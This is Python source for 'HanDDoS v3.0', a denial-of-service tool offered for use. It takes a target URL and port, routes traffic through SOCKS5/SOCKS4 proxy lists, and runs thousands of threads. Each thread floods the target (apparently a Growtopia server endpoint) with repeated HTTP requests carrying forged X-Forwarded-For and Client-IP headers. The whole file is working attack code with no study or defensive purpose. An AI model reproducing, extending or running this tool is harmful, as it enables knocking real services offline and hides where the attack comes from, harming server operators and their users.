acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
"Accept-Encoding: gzip, deflate\r\n", 
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xhtml+xml",
"Accept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

import os, sys

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install PySocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install PySocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("windows"):
        try:
            os.system("pip install PySocks requests wget cfscrape urllib3 scapy")
        except:
            print("[!] Failure when installing libraries... please install manual using command \"pip install PySocks requests wget cfscrape urllib3 scapy\".")
    else:
        os.system("pip3 install PySocks requests wget cfscrape urllib3 scapy")
import time, socket, socks, threading, random, re, os
from threading import Thread
from time import sleep
from os import system
from sys import stdout
from scapy.all import *
from random import randint

def logo():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title HanDDoS v3.0")
    print('''
          ========================================================
          [!]    This DDoS Tools originally by @Gioxa   [!]
          ========================================================
                          HanDDoS - Simply DDoS Tools              
          ====================== Version: 3.0 ====================
                        \____________________________/
                        
          [o]             PLEASE USE AT YOUR OWN RISK          [o]''')
    try:
        print("\n[*] Target : " +str(url_main)+ ":" +str(port))
    except:
        pass
    try:
        print("[*] Method : " +str(name_method_attack))
    except:
        pass
    try:
        print("[*] Mode   : " +str(filenam2))
    except:
        pass
    try:
        print("[*] Proxies: %s" %(len(open(out_file).readlines())))
    except:
        pass
    try:
        print("[*] Threads: " +str(threads))
    except:
        pass
        
def start_url():
    global url, url_main, host_url, host_ip, port
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    elif sys.platform.startswith("windows"):
        path = "C:/Program Files/nodejs/node.exe"
        if (not os.path.isfile(path)):
            print("[!] Please Install NodeJs first. [!]")
            #down = wget.download("https://nodejs.org/dist/v12.13.0/node-v12.13.0-x64.msi")
            #down
            #os.system("node-v12.13.0-x64.msi")
    else:
        pass
    logo()
    url = input("\n[!] Target [URL/IP]: ").strip()
    if url == "":
        start_url()
    url_main = url
    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("[!] Please type the target correctly")
        start_url()
    logo()
    try:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
    host_ip = socket.gethostbyname(host_url)
    start_port()
    logo()
    proxies_list()
    
def start_port():
    global port
    print("-----------------------------")
    port = int(80)
    port = str(input("[!] Port [80]: "))
    if port == '':
        if "https" in url:
                port = int(443)
                print("[!] Selected Port = 443 [!]")
        else:
            port = int(80)
            print("[!] Selected Port = 80 [!]")
    else:
        port = int(port)

def proxies_list():
    global fileproxies, proxies, out_file
    print("-----------------------------")
    if sys.platform.startswith("linux"):
        pass
    elif sys.platform.startswith("freebsd"):
        pass
    else:
        for file in glob("*.phy"):
            print("[o] " + file)
            print("================")
    print("[!] Default : socks.phy")
    out_file = str(input("[o] Socks [socks.phy]: "))
    if out_file == "":
        out_file = "socks.phy"
    proxies = open(out_file).readlines()
    #print ("[!] Number Of Proxies: %s" %(len(open(out_file).readlines())))
    logo()
    numthreads()
    
def numthreads():
    global threads
    try:
        print("-----------------------------")
        threads = int(input("[+] Threads [4000-6000]: "))
    except ValueError:
        threads = int(3000)
        print ("[!] Selected Threads " +str(threads)+ " [!]\n")
    logo()
    attack()

def attack():
    global threads, get_host, acceptall, connection, x, multiple
    x     = int(0)
    error = int(0)
    req_code = int(0)
    multiple = int(500)
    connection = "Connection: Keep-Alive\r\n"
    print("================================")
    print("          ATTACK LOGS           ")
    print("================================")
    for x in range(threads):
        Socks(x+1).start()
        Socks(x+1).start()

class Socks(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error, count
        useragent = "User-Agent: " + random.choice(['byebye', 'byebye']) + "\r\n"
        accept    = random.choice(acceptall)
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward   = "X-Forwarded-For: " + randomip + "\r\n"
        forward  += "Client-IP: " + randomip + "\r\n"
        referer   = "Referer: " + random.choice(['HanDDoSv3', 'nicetry boy', 'hope thats still good']) + "\r\n"
        http_type = random.choice(['HTTP/0.9', 'HTTP/1.0', 'HTTP/1.1', 'HTTP/2.0'])
        get_host = random.choice(['GET','POST','HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'CONNECT', 'TRACE']) + " /growtopia/server_data.php " + http_type + "\r\nHost: " + host_url + ":" + str(port) + "\r\n"
        request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] HanDDoSv3 > Socks5 [" + str(proxy[0]) + "] X> [" + host_url + ":" + str(port) + "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                except:
                    try:
                        s.close()
                    except:
                        pass
            except:
                try:
                    s.close()
                except:
                    pass
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(host_url), int(port)))
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    s.send(str.encode(request))
                    s.send(str.encode(request))
                    s.send(str.encode(request))
                    s.send(str.encode(request))
                    s.send(str.encode(request))
                    s.send(str.encode(request))
                    print("[+] HanDDoSv3 > Socks4 [" +str(proxy[0])+ "] X> [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                            s.send(str.encode(request))
                    except:
                        try:
                            s.close()
                        except:
                            pass
                except:
                    try:
                        s.close()
                        proxy = random.choice(proxies).strip().split(":")
                    except:
                        pass
                        
if __name__ == '__main__':
    start_url()
